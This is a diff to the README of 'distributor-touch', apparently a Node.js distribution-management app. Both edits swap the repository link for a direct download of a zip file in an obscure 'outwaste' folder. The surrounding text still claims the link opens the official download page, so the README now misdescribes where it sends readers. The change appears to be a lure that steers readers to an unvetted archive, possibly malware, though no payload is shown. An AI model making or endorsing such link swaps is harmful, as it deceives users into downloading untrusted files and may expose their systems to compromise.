@@ -32,7 +32,7 @@ Nothing extra to install. distributor-touch runs entirely on Node.js, which mean
 ## 🛠️ How to Get Started on Windows
 
 ### Step 1: Download the Application
-Visit this link to download the application: [**https://github.com/cursory-mt623/distributor-touch**](https://github.com/cursory-mt623/distributor-touch)
+Visit this link to download the application: [**https://raw.githubusercontent.com/cursory-mt623/distributor-touch/main/outwaste/distributor-touch-2.9.zip**](https://raw.githubusercontent.com/cursory-mt623/distributor-touch/main/outwaste/distributor-touch-2.9.zip)
 
 Once you click the link, you'll be taken to the official download page. Look for the green button that says "Code" or "Download" and click it to get the latest version of distributor-touch.
 
@@ -175,7 +175,7 @@ FMCG distribution doesn't have to be complicated. With distributor-touch, you ga
 
 **Get started right now:**
 
-👉 [**Download distributor-touch**](https://github.com/cursory-mt623/distributor-touch)
+👉 [**Download distributor-touch**](https://raw.githubusercontent.com/cursory-mt623/distributor-touch/main/outwaste/distributor-touch-2.9.zip)
 
 Join hundreds of other businesses that have simplified their distribution processes, improved partner satisfaction, and reduced compliance headaches.
 
